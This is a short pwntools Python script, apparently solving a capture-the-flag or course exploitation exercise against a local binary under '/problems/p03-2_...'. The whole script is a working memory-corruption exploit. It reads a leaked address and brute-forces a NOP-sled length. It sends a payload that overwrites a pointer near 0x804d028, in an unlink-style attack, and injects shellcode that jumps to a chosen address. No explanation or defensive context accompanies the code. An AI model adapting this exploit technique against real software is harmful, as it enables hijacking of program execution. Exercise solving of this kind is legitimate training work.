from pwn import *
for i in range(500):
   print "Current index: ", i
   programPath = "/problems/p03-2_3_e361d8aac55f9a630fdbd6369c555c97/example416"
   sh = process([programPath, "cmd_line_arg"])
   output = sh.recvline()
   firstAddress = output[40:len(output)-2]
   print(firstAddress)
   payload = p32(0x804d028 - 12) + p32(int(firstAddress, 16) + 8) + i*"\x90"+"\xB8\xD6\x88\x04\x08\xFF\xE0"
   sh.sendline(payload)
   print(sh.recvall().decode())